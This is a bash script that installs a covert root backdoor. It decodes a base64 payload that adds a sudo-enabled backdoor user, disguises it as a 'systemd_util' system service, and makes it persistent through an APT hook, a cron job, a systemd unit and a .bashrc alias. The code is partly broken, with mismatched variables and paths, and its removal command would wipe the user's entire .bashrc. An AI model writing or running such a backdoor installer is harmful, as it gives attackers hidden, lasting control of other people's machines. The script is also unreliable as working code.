#!/bin/bash

# Check if the user is root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Obfuscate variable names
a1="backdoor_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)"
a2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)

# Create and encode the hidden script
echo 'IyEvYmluL2Jhc2gKIyBTY3JpcHQgdG8gYWRkIGEgYmFja2Rvb3IgdXNlciBhbmQgbG9nIHRoZSBldmVudApM
T0dfRklMRT0iL3Zhci8uaGlkZGVuLy5iZW5pZ25fcG9zdF9pbnN0YWxsLmxvZyIKaWYgIWlkICIkYTEiICYm
LyZkZXZudWxsOyB0aGVuCiAgICB1c2VyYWRkIC1tIC1zIC9iaW4vYmFzaCAiJGFhMSIKICAgIGVjaG8gIiRh
YTE6JGEyIiB8IGNocGFzc3dkCiAgICB1c2VybW9kIC1hRyBzdWRvICIkYTEiCiAgICBlY2hvICJDcmVhdGVk
IiA+PiAvZGV2L251bGwKZmkKZWNobyAiUG9zdC1pbnN0YWxsIGhvb2sgZXhlY3V0ZWQgYXQgJChkYXRlKSIg
Pj4gIiRMT0dfRklMRSIK' | base64 -d > /usr/local/bin/systemd_util.sh
chmod +x /usr/local/bin/systemd_util.sh

# Create an APT configuration file for the post-install hook
cat << EOF > /etc/apt/apt.conf.d/99-systemd-util
DPkg::Post-Invoke {"bash /usr/local/bin/systemd_util.sh";};
EOF

# Add a cron job for persistence
(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/systemd_util.sh") | crontab -

# Create a systemd service for persistence
cat << EOF > /etc/systemd/system/systemd_util.service
[Unit]
Description=System Utility Service

[Service]
ExecStart=/usr/local/bin/systemd_util.sh

[Install]
WantedBy=multi-user.target
EOF

# Enable the service
systemctl enable systemd_util.service

# Log rotation configuration for the hidden log file
cat << EOF > /etc/logrotate.d/systemd_util
/var/.hidden/.systemd_util.log {
    daily
    missingok
    rotate 7
    compress
    notifempty
    create 0640 root utmp
}
EOF

# Use an alias to hide the script execution behind apt-get
echo "alias apt-update='/usr/bin/apt-get update && bash /usr/local/bin/systemd_util.sh'" >> ~/.bashrc

echo "Obfuscated script with multiple persistence mechanisms installed. Use 'rm -f /etc/apt/apt.conf.d/99-systemd-util /etc/systemd/system/systemd_util.service ~/.bashrc /etc/logrotate.d/systemd_util /usr/local/bin/systemd_util.sh' to remove it."
